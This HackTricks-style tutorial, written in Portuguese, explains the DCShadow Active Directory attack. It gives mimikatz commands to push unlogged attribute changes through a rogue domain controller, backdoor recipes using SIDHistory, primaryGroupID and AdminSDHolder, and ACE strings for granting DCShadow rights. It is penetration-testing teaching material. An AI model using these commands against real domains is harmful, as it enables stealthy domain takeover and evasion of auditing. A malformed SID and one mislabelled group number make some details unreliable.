{{#include ../../banners/hacktricks-training.md}}

# DCShadow

Ele registra um **novo Controlador de Domínio** no AD e o utiliza para **empurrar atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar quaisquer **logs** sobre as **modificações**. Você **precisa de privilégios de DA** e estar dentro do **domínio raiz**.\
Note que se você usar dados incorretos, logs bem feios aparecerão.

Para realizar o ataque, você precisa de 2 instâncias do mimikatz. Uma delas iniciará os servidores RPC com privilégios de SYSTEM (você deve indicar aqui as alterações que deseja realizar), e a outra instância será usada para empurrar os valores:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
Observe que **`elevate::token`** não funcionará na sessão `mimikatz1`, pois isso elevou os privilégios da thread, mas precisamos elevar o **privilégio do processo**.\
Você também pode selecionar um objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Você pode enviar as alterações de um DA ou de um usuário com essas permissões mínimas:

- No **objeto de domínio**:
- _DS-Install-Replica_ (Adicionar/Remover Réplica no Domínio)
- _DS-Replication-Manage-Topology_ (Gerenciar Topologia de Replicação)
- _DS-Replication-Synchronize_ (Sincronização de Replicação)
- O **objeto Sites** (e seus filhos) no **container de Configuração**:
- _CreateChild e DeleteChild_
- O objeto do **computador que está registrado como um DC**:
- _WriteProperty_ (Não Write)
- O **objeto alvo**:
- _WriteProperty_ (Não Write)

Você pode usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para conceder esses privilégios a um usuário sem privilégios (observe que isso deixará alguns logs). Isso é muito mais restritivo do que ter privilégios de DA.\
Por exemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Isso significa que o nome de usuário _**student1**_ ao fazer login na máquina _**mcorp-student1**_ tem permissões DCShadow sobre o objeto _**root1user**_.

## Usando DCShadow para criar backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - Conceder permissões DCShadow usando DCShadow (sem logs de permissões modificadas)

Precisamos adicionar os seguintes ACEs com o SID do nosso usuário no final:

- No objeto de domínio:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- No objeto do computador atacante: `(A;;WP;;;UserSID)`
- No objeto do usuário alvo: `(A;;WP;;;UserSID)`
- No objeto Sites no contêiner de Configuração: `(A;CI;CCDC;;;UserSID)`

Para obter o ACE atual de um objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Observe que, neste caso, você precisa fazer **várias alterações,** não apenas uma. Portanto, na **sessão mimikatz1** (servidor RPC), use o parâmetro **`/stack` com cada alteração** que deseja fazer. Dessa forma, você só precisará **`/push`** uma vez para realizar todas as alterações acumuladas no servidor rogue.

[**Mais informações sobre DCShadow em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
